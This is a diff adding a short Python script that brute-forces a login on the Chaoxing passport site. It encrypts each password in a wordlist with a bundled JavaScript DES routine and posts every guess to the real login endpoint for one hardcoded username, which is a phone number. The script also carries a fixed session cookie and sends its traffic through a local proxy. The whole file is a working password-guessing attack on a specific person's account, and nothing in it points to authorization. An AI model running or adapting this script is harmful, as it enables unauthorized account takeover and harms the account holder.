@@ -1,0 +1,32 @@
+import execjs
+import requests
+
+with open('1.js','r')as f:
+    file = f.read()
+filex = open('pass1.txt','r')
+filex = filex.readlines()
+
+def bao(a):
+    js = execjs.compile(file)
+    res = js.call('encryptByDES', a)
+    url = 'http://passport2.chaoxing.com/fanyalogin'
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
+        "Cookie": "JSESSIONID=38EBC33328CF559CFC2D5ABB3CEABD8C"
+    }
+    data = {
+        "fid": "-1",
+        "uname": "15960819163",
+        "password": res,
+        "refer": "https%253A%252F%252Fi.chaoxing.com",
+        "t": "false",
+        "forbidotherlogin": "0",
+        "validate": ""
+    }
+    response = requests.post(url, headers=headers, data=data,proxies={"http": "http://127.0.0.1:8080"}).content.decode()
+    print(response)
+
+if __name__=="__main__":
+    for z in filex:
+        z = z.rstrip()
+        bao(z)
